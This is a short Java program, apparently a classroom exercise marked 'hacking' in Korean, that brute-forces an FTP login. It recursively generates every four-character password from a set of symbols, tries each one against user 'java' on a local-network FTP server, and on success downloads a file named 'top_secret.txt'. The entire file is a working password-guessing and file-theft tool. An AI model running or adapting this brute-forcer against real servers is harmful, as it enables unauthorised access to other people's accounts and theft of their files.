/*해킹*/

import java.io.File;
import java.util.ArrayList;

import it.sauronsoftware.ftp4j.FTPClient;

public class Quiz02 {
	// 재귀 함수를 사용하여 중복 순열 생성
    public static void generatePermutations(char[] nums, StringBuilder sb, int index, ArrayList<String> result) {
        // 기저 사례: 순열의 길이가 원하는 길이에 도달하면 결과에 추가
        if (index == 4) {
            result.add(sb.toString());
            return;
        }
        
        // 모든 숫자에 대해 시도
        for (int i = 0; i < nums.length; i++) {
            // 숫자 선택
            sb.append(nums[i]);
            
            // 다음 자리에 대한 재귀 호출
            generatePermutations(nums, sb, index + 1, result);
            
            // 백트래킹: 선택 취소
            sb.deleteCharAt(sb.length() - 1);
        }
    }
    

	public static void main(String[] args) {
		FTPClient client = new FTPClient();
		try {
			client.connect("192.168.0.161");

		}catch(Exception e) {
			e.printStackTrace();
			return;
		}

		char[] keys="!@$%^&*()".toCharArray();
		StringBuilder sb = new StringBuilder();
	    ArrayList<String> result = new ArrayList<>();

		generatePermutations(keys, sb, 0, result);
		
		for(String str: result) {
			try{
				client.login("java",str); //1 3 5
				System.out.println("로그인 성공");
				try {
					client.download("top_secret.txt", new File("C:/workspace/downloads/top_secret2.txt"));
					System.out.println("다운로드가 성공적으로 완료되었습니다.");
				}catch(Exception e) {
					System.out.println("다운로드 실패");
					e.printStackTrace();
					continue;
				}
				break;
			}catch(Exception e) {
				e.printStackTrace();
				continue;
			}
		}

	}
}
